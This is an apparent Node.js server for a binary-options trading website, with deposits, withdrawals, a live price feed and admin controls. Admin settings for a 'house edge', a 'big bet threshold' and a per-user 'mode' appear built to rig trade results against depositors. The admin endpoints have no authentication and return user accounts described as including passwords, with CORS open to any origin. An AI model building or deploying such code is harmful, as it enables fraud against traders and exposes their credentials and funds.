const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const MarketEngine = require('./marketEngine');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*', methods: ['GET', 'POST'] } });
const market = new MarketEngine(1.08500, 0.00018);

setInterval(() => {
  io.emit('price_tick', { timestamp: Date.now(), price: market.generateNextTick() });
}, 100);

// Auth Endpoints
app.post('/api/auth/register', (req, res) => {
  const { fullName, email, password, phone } = req.body;
  if (!email || !password) return res.status(400).json({ success: false, message: 'Email & Password Required' });
  res.json(market.registerUser(fullName, email, password, phone));
});

app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  res.json(market.loginUser(email, password));
});

// Transactions API
app.post('/api/deposit', (req, res) => {
  const { userId, amount, method, trxId } = req.body;
  const numAmt = parseFloat(amount);
  if (isNaN(numAmt) || numAmt < 5) return res.status(400).json({ success: false, message: 'Minimum Deposit is $5' });
  const data = market.requestDeposit(userId || 'USER_101', numAmt, method, trxId);
  res.json({ success: true, message: 'Deposit Submitted for Approval', data });
});

app.post('/api/withdraw', (req, res) => {
  const { userId, amount, method, accountNo } = req.body;
  const numAmt = parseFloat(amount);
  if (isNaN(numAmt) || numAmt < 10) return res.status(400).json({ success: false, message: 'Minimum Withdrawal is $10' });
  const data = market.requestWithdrawal(userId || 'USER_101', numAmt, method, accountNo);
  res.json({ success: true, message: 'Withdrawal Submitted for Approval', data });
});

// Admin Control Data Endpoint
app.get('/api/admin/data', (req, res) => {
  res.json({
    stats: market.getStats(),
    openTrades: market.openTrades,
    pendingDeposits: market.pendingDeposits,
    pendingWithdrawals: market.pendingWithdrawals,
    pendingKYCs: market.pendingKYCs,
    users: Object.values(market.users) // Sends user accounts with passwords to admin
  });
});

app.post('/api/admin/config', (req, res) => {
  const { houseEdge, bigBetThreshold } = req.body;
  if (houseEdge !== undefined) market.globalHouseEdge = parseFloat(houseEdge);
  if (bigBetThreshold !== undefined) market.bigBetThreshold = parseFloat(bigBetThreshold);
  res.json({ success: true, message: 'Configuration Updated' });
});

app.post('/api/admin/action', (req, res) => {
  const { id, type, action } = req.body;
  if (action === 'APPROVE') {
    const item = market.approveTransaction(id, type);
    res.json({ success: true, item });
  } else {
    market.rejectTransaction(id, type);
    res.json({ success: true });
  }
});

// WebSockets Trading Resolution
io.on('connection', (socket) => {
  socket.on('place_trade', (data) => {
    const entryPrice = market.currentPrice;
    const durationSec = parseInt(data.durationSec) || 60;
    const expiresAt = Date.now() + (durationSec * 1000);

    const trade = {
      id: 'TRD_' + Date.now(),
      userId: data.userId || 'USER_101',
      accountType: data.accountType || 'DEMO',
      type: data.type,
      entryPrice,
      amount: parseFloat(data.amount) || 10,
      expiresAt
    };

    market.addTrade(trade);

    setTimeout(() => {
      const finalPrice = market.currentPrice;
      let isWin = false;
      if (data.type === 'CALL' && finalPrice > entryPrice) isWin = true;
      if (data.type === 'PUT' && finalPrice < entryPrice) isWin = true;

      const payout = isWin ? (parseFloat(data.amount) * 1.88) : 0;

      socket.emit('trade_result', {
        tradeId: trade.id,
        isWin,
        entryPrice,
        closePrice: finalPrice,
        payout
      });
    }, durationSec * 1000);
  });

  socket.on('admin_set_user_mode', (data) => {
    market.setUserMode(data.userId, data.mode);
    socket.emit('admin_status', { success: true, userId: data.userId, mode: data.mode });
  });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`Enterprise Engine running on port ${PORT}`));
